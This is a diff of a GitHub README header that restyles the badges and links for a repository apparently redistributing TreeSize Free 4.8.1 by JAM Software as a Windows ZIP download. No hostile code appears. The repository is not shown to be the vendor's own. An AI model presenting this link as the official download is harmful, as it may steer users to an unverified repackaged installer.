@@ -4,17 +4,25 @@
 
 ### See what is taking up space on your Windows PC
 
-![Windows](https://img.shields.io/badge/platform-Windows-2563eb?style=flat-square&logo=windows&logoColor=white)
-![TreeSize Free 4.8.1](https://img.shields.io/badge/TreeSize%20Free-4.8.1-16a36a?style=flat-square)
-![Package](https://img.shields.io/badge/package-original%20installer%20in%20ZIP-334155?style=flat-square)
+<p align="center">
+  <img src="https://img.shields.io/badge/platform-Windows-2563eb?style=flat-square&logo=windows&logoColor=white" alt="Windows">
+  &nbsp;
+  <img src="https://img.shields.io/badge/TreeSize%20Free-4.8.1-16a36a?style=flat-square" alt="TreeSize Free 4.8.1">
+  &nbsp;
+  <img src="https://img.shields.io/badge/package-original%20installer%20in%20ZIP-334155?style=flat-square" alt="Original installer in ZIP">
+</p>
 
 **TreeSize Free by JAM Software.**
 
-[**Download TreeSize Free for Windows →**](https://github.com/TreeSizeSoft/treesize-download/releases/latest/download/TreeSizeFree-4.8.1-Windows.zip)
-&nbsp; · &nbsp;
-[Product overview](https://github.com/TreeSizeSoft/treesize-download#what-it-does)
-&nbsp; · &nbsp;
-[Release notes](https://github.com/TreeSizeSoft/treesize-download/releases)
+<p align="center">
+  <a href="https://github.com/TreeSizeSoft/treesize-download/releases/latest/download/TreeSizeFree-4.8.1-Windows.zip"><img src="https://img.shields.io/badge/Download-Windows%20ZIP-16865b?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"></a>
+</p>
+
+<p align="center">
+  <a href="https://github.com/TreeSizeSoft/treesize-download#what-it-does">Product overview</a>
+  &nbsp;&nbsp;·&nbsp;&nbsp;
+  <a href="https://github.com/TreeSizeSoft/treesize-download/releases">Release notes</a>
+</p>
 
 </div>
 
